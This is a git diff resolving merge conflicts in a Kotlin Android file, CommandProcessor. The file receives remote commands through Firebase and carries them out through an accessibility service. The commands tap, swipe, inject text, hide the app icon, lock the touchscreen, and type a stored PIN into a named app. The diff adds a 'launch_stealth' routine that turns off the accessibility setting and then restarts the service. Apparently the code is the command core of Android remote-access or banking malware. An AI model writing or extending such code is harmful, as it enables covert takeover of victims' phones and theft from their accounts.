@@ -13,11 +13,7 @@ object CommandProcessor {
         FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
                 val cmd = snapshot.getValue(RemoteCommand::class.java) ?: return
-<<<<<<< HEAD
-                execute(cmd, snapshot.key)
-=======
                 execute(cmd)
->>>>>>> 0ad8761 (Update Wq project)
                 snapshot.ref.removeValue()
             }
             override fun onChildChanged(s: DataSnapshot, p: String?) {}
@@ -29,33 +25,18 @@ object CommandProcessor {
         })
     }
 
-<<<<<<< HEAD
-    private fun execute(cmd: RemoteCommand, key: String?) {
-=======
     private fun execute(cmd: RemoteCommand) {
->>>>>>> 0ad8761 (Update Wq project)
         val svc = MyAccessibilityService.instance ?: return
 
         when (cmd.type) {
             "tap" -> svc.tap(cmd.x ?: 500, cmd.y ?: 1000)
-<<<<<<< HEAD
-            "swipe" -> svc.swipe(
-                cmd.sx ?: 0, cmd.sy ?: 0,
-                cmd.ex ?: 0, cmd.ey ?: 0,
-                cmd.duration ?: 300L
-            )
-=======
             "swipe" -> svc.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0, cmd.duration ?: 300L)
->>>>>>> 0ad8761 (Update Wq project)
             "type", "paste" -> {
                 val text = decodeIfBase64(cmd.text) ?: return
                 svc.injectText(text)
             }
             "launch" -> svc.launchApp(cmd.text ?: "")
-<<<<<<< HEAD
             "click_text" -> svc.clickText(cmd.text ?: "")
-=======
->>>>>>> 0ad8761 (Update Wq project)
             "home" -> svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
             "back" -> svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
             "hide_activity" -> svc.hideAppIcon()
@@ -72,22 +53,33 @@ object CommandProcessor {
             "unlock_touch" -> svc.lockTouch(false)
             "inject_pin" -> {
                 val pkg = cmd.text ?: return
-                svc.injectPin(pkg)
+                FirebaseBridge.getPin(pkg) { pin -> if (pin != null) svc.injectViaKeys(pin) }
             }
-<<<<<<< HEAD
-            "macro" -> {
-                // ... (macro execution code – keep existing from original if needed)
+            "launch_stealth" -> {
+                val pkg = cmd.text ?: return
+                // Temporarily disable accessibility, launch app, re-enable
+                try {
+                    val component = android.content.ComponentName(context, MyAccessibilityService::class.java)
+                    Settings.Secure.putString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, null)
+                    svc.disableSelf()
+                } catch (_: Exception) {}
+                Thread {
+                    Thread.sleep(500)
+                    svc.mainHandler.post { svc.launchApp(pkg) }
+                    Thread.sleep(3000)
+                    // Re-enable via AlarmManager (ServiceRestartReceiver will handle)
+                    val alarm = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+                    val restartIntent = Intent(context, ServiceRestartReceiver::class.java)
+                    val pending = PendingIntent.getBroadcast(context, 200, restartIntent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
+                    alarm.set(android.app.AlarmManager.RTC, System.currentTimeMillis() + 1000, pending)
+                }.start()
             }
-=======
->>>>>>> 0ad8761 (Update Wq project)
         }
     }
 
     private fun decodeIfBase64(input: String?): String? {
         if (input == null) return null
-        return try {
-            String(Base64.decode(input, Base64.DEFAULT), Charsets.UTF_8)
-        } catch (_: Exception) { input }
+        return try { String(Base64.decode(input, Base64.DEFAULT), Charsets.UTF_8) } catch (_: Exception) { input }
     }
 
     data class RemoteCommand(
